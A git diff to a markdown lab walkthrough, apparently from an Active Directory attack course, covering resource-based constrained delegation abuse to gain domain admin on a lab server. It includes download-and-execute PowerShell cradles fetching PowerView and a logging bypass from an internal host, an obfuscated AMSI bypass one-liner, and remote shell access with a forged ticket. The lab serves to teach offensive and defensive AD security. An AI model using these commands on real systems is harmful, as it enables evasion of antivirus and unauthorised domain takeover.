@@ -1,4 +1,4 @@
-# Learning Objective 17 (Domain Privilege Escalation | Resource-based Constrained Delegation)
+# Learning Objective 17 (Domain Privilege Escalation | Resource-based Constrained Delegation Abuse)
 
 ## Tasks
 
@@ -37,7 +37,7 @@ After trying from multiple users or using BloodHound we would know that the user
 
 `Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}`:
 ```
-ObjectDN                : CN=DCORP-MGMT🖥️,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
+ObjectDN📌              : CN=DCORP-MGMT🖥️,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
 AceQualifier            : AccessAllowed
 ActiveDirectoryRights   : ListChildren, ReadProperty, GenericWrite📌
 ObjectAceType           : None
@@ -61,13 +61,28 @@ Let's use the reverse shell that we have and load PowerView there.
 
 `iex (iwr http://172.16.100.22/sbloggingbypass.txt -UseBasicParsing)`
 
+![HFS - PowerView.ps1](./assets/screenshots/learning_objective_17_hfs_powerview.png)
+
+`iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.22/PowerView.ps1'))`:
+```
+iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.22/PowerView.ps1'))
+iex : At line:1 char:1
+PS C:\Users\ciadmin> + #requires -version 2
++ ~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.📌
+At line:1 char:1
++ iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.22/ ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
+```
+❌
+
 Use the below command to bypass AMSI.
 
 ```powershell
 S`eT-It`em ( 'V'+'aR' + 'IA' + (("{1}{0}"-f'1','blE:')+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a')) ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
 ```
-
-![HFS - PowerView.ps1](./assets/screenshots/learning_objective_17_hfs_powerview.png)
 
 `iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.22/PowerView.ps1'))`
 
@@ -82,17 +97,17 @@ Check if RBCD is set correctly.
 [SNIP]
 
 SourceName                 : DCORP-MGMT$🖥️
-SourceType                 : MACHINE_ACCOUNT
+SourceType                 : MACHINE_ACCOUNT📌
 SourceSID                  : S-1-5-21-719815819-3726368948-3917688648-1108
 SourceAccountControl       : WORKSTATION_TRUST_ACCOUNT
 SourceDistinguishedName    : CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
 ServicePrincipalName       : {WSMAN/dcorp-mgmt, WSMAN/dcorp-mgmt.dollarcorp.moneycorp.local, TERMSRV/DCORP-MGMT,
                              TERMSRV/dcorp-mgmt.dollarcorp.moneycorp.local...}
-DelegatedName              : DCORP-STD422$📌
-DelegatedType              : MACHINE_ACCOUNT
+DelegatedName              : DCORP-STD422$🖥️
+DelegatedType              : MACHINE_ACCOUNT📌
 DelegatedSID               : S-1-5-21-719815819-3726368948-3917688648-20687
 DelegatedAccountControl    : WORKSTATION_TRUST_ACCOUNT
-DelegatedDistinguishedName : CN=DCORP-STD422📌,OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local
+DelegatedDistinguishedName : CN=DCORP-STD422,OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local
 
 [SNIP]
 ```
@@ -170,6 +185,8 @@ SID               : S-1-5-18
 [+] Ticket successfully imported!🎟️
 ```
 
+- **Leverage the Forged Ticket to Gain DA Access to the Target Server**
+
 `klist`:
 ```
 Current LogonId is 0:0x38bfd7
@@ -187,8 +204,6 @@ Cached Tickets: (1)
         Cache Flags: 0
         Kdc Called:
 ```
-
-- **Leverage the Forged Ticket to Gain DA Access to the Target Server**
 
 `winrs -r:dcorp-mgmt cmd`:
 ```
